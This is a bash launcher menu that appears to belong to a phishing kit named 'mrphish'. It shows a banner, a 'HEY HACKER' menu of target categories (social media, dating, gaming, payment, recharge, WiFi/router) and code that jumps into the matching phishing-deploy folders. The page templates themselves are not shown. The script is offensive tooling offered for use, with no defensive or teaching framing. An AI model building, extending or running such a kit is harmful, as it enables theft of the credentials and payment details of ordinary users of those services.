clear
echo -e "
                      __  __  ____  _  _  __  __ 
                     (  \/  )( ___)( \( )(  )(  )
                      )    (  )__)  )  (  )(__)( 
                     (_/\/\_)(____)(_)\_)(______)"
echo
echo -e "\e[96m        |-----------------------------------------------------|"                                                     
echo -e "\e[96m        |-------------------\e[92mSELECT OPTIONS\e[96m--------------------|"
echo -e "\e[96m        |-----------------------------------------------------|"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |                [\e[92m1\e[96m]==> SOCIAL MEDIA                  |"
echo -e "\e[96m        |                [\e[92m2\e[96m]==> DATING                        |"
echo -e "\e[96m        |                [\e[92m3\e[96m]==> GAMING                        |"
echo -e "\e[96m        |                [\e[92m4\e[96m]==> PAYMENT                       |"
echo -e "\e[96m        |                [\e[92m5\e[96m]==> RECHARGE                      |"
echo -e "\e[96m        |                [\e[92m6\e[96m]==> WIFI/ROUTER                   |"
echo -e "\e[96m        |                [\e[92m7\e[96m]==> OTHERS                        |"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |                [\e[92m8\e[96m]==> BACK                          |"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |-----------------------------------------------------|"
echo -e "\e[96m        |---------------------\e[91mHEY HACKER\e[96m----------------------|"
echo -e "\e[96m        |-----------------------------------------------------|"
sleep 0.6
read -p $'\n\e[1;96m[\e[0m\e[1;92m+\e[0m\e[1;96m] SELECT OPTION: \e[0m' option
if [[ $option == 1 || $option == 01 ]]; then
echo
cd $HOME/mrphish/core/deploys/socialmedia/
clear
bash menu
echo
elif [[ $option == 2 || $option == 02 ]]; then
echo
echo
cd $HOME/mrphish/core/deploys/dating
clear
bash menu
elif [[ $option == 3 || $option == 03 ]]; then
echo
cd $HOME/mrphish/core/deploys/gaming
clear
bash menu
elif [[ $option == 4 || $option == 04 ]]; then
echo
cd $HOME/mrphish/core/deploys/payment
clear
bash menu
elif [[ $option == 5 || $option == 05 ]]; then
echo
cd $HOME/mrphish/core/deploys/recharge
clear
bash menu
elif [[ $option == 6 || $option == 06 ]]; then
echo
cd $HOME/mrphish/core/deploys/wifirt
clear
bash menu
elif [[ $option == 7 || $option == 07 ]]; then
echo
echo
cd $HOME/mrphish/core/deploys/others
clear
bash menu
elif [[ $option == 8 || $option == 08 ]]; then
echo
echo
cd $HOME/mrphish/core          
clear
bash back
elif [[ $option == 0 ]]; then
clear
echo
printf "                     \e[1;96m Have A Good Day ........! \e[0m\n"
echo
sleep 3.0
exit 3
else
printf "                      \e[1;96m [!] Invalid option!\e[0m\n"
sleep 4.0
bash menu.sh
fi
